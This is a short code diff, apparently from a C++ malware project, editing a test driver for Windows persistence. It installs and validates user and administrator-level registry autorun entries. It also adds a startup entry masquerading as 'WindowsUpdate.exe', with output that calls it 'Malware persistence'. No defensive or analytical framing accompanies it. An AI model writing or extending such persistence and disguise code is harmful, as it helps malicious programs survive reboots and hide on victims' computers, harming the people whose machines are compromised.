@@ -11,8 +11,8 @@ int main()
 
     std::cout << "=== REGISTRY PERSISTENCE TEST ===\n\n";
 
-    if (regPersist.installUserPersistence(programName, programPath)) {
-        std::cout << "Persistence installed successfully!\n";
+    if (regPersist.installPersistence(programName, programPath)) {
+        std::cout << "User persistence installed successfully!\n";
         std::cout << "Entry: " << programName << " -> " << programPath << "\n";
 
         if (regPersist.validatePersistence(programName)) {
@@ -22,6 +22,20 @@ int main()
     }
     else {
         std::cout << "Failed to install persistence\n";
+    }
+
+    if (regPersist.installPersistence("SystemTestPersistence", programPath, true)) { 
+        std::cout << "System persistence installed successfully!\n";
+
+        if (regPersist.validatePersistence("SystemTestPersistence")) {
+            std::cout << "System persistence validated!\n";
+        }
+
+        regPersist.removePersistence("SystemTestPersistence");
+        std::cout << "System persistence removed!\n";
+    }
+    else {
+        std::cout << "Failed, you need to run as Administrator\n";
     }
 
     if (regPersist.removePersistence(programName)) {
@@ -40,7 +54,7 @@ int main()
 
     std::cout << "\n\n=== STARTUP PERSISTENCE TEST ===\n\n";
 
-    if (startPersist.installStartup("WindowsUpdate.exe", "user")) { 
+    if (startPersist.installStartup("WindowsUpdate.exe")) { 
         std::cout << "Malware persistence installed successfully!\n";
         std::cout << "Will auto-start as: WindowsUpdate.exe\n";
     }
